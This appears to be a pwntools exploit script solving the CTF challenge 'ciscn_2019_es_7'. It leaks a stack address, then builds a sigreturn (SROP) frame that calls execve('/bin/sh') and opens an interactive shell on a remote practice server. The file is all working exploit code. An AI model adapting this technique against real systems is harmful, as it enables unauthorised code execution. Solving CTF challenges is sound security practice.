#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.arch = 'amd64'
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./ciscn_2019_es_7")
	elf = ELF("./ciscn_2019_es_7")
else:
	p = remote("node3.buuoj.cn",25410)
	elf = ELF("./ciscn_2019_es_7")

syscall = 0x400517
sys_read = 0x4004F1
sigreturn = 0x4004DA
execve = 0x4004E2
vuln = 0x4004ED

###leak stack###
payload = "/bin/sh\x00" + 'A' * 0x8 + p64(sys_read)
sd(payload)

#gdb.attach(p)

stack = u64(ru("\x7f")[-6:].ljust(8,'\x00'))
success(hex(stack))

###SROP###
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack - 0x118  #/bin/sh
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack
sigframe.rip = syscall


payload = p64(vuln) + "\x00" * 0x8
payload+= p64(sigreturn) + p64(syscall) + str(sigframe)
sd(payload)

###get shell###
ia()
